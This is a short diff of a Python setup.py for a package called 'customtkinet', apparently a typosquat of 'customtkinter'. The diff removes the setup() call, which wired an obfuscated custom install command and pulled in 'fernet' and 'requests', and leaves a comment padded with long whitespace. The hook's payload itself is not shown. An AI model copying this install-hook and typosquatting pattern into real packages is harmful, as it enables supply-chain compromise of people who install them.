@@ -18,22 +18,5 @@ class erGVFOQoTcnqDWEYugaKdvvikHrqnTZuaiZLbOgWzYWqBzPieOstpUECFUSUsaxiwseNtohjKY
             install.run(self)
 
 
-setup(
-    name="customtkinet",
-    version=VERSION,
-    author="BMxVV",
-    author_email="yhCHyqxodf@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': erGVFOQoTcnqDWEYugaKdvvikHrqnTZuaiZLbOgWzYWqBzPieOstpUECFUSUsaxiwseNtohjKYtoqtBmJCpHwMUTUZswzclNsgPNyuBwzbmRpeckiMgyjTRFrxoYEGOfTUKUTCWXOZeZlehKHKuOufylqeUNflKylleFxuxHNbkkPbasDmOkXJGPAWPMuGNfmbRdg,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
 
